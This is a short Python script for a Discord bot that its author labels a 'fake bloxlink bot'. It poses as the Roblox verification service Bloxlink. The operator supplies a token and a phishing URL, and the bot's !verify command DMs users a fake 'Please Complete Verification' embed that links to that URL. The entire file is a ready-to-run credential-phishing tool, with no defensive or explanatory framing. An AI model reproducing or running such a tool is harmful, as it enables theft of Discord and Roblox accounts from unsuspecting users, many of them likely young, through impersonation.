import discord
from discord.ext import commands
import requests
from rich.console import Console
import time
from time import sleep
import os

console = Console()

waitTime = 0

def clear():
    os.system('cls')
clear()
time.sleep(waitTime)
empty = " "
print(empty)
print(empty)

console.print("""
   ▄▄▄▄▄   ██   ███   ▄███▄   █▄▄▄▄   ▄▄▄▄▄   
  █     ▀▄ █ █  █  █  █▀   ▀  █  ▄▀  █     ▀▄ 
▄  ▀▀▀▀▄   █▄▄█ █ ▀ ▄ ██▄▄    █▀▀▌ ▄  ▀▀▀▀▄   
 ▀▄▄▄▄▀    █  █ █  ▄▀ █▄   ▄▀ █  █  ▀▄▄▄▄▀    
              █ ███   ▀███▀     █             
             █                 ▀              
            ▀                       
""", style="bold blue")
time.sleep(waitTime)
console.print("sabers: fake bloxlink bot", style="bold blue")
time.sleep(waitTime)

token = input("TOKEN: $")
prefix = "!"
title = "Please Complete Verification"
desc ="To verify your account, please friend this randomly generated user."
field = "Please Login and friend the user."
saberscultttttttttttttttt = "show sum love ya my discord is saberscult"
hyperlink = "here"
phish = input("YOUR PHISH: $")

status = discord.Status.online
activity = discord.Activity(type=discord.ActivityType.playing, name ="Roblox")

intents = discord.Intents.all()
client = commands.Bot(command_prefix= prefix, intents = intents)
client.remove_command('help')
status = status
activity = activity

@client.event
async def on_ready():
  await client.change_presence(status=discord.Status.online, activity=discord.Game('Roblox!'))

print("i hope you skids end up on the streets")

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")

@client.command()
async def verify(ctx):
    await ctx.send('Sent verification info. Please check your DMs.')
    await ctx.author.send(embed=main)

print("this might be a bit shit i did it in a rush")

client.run(token)
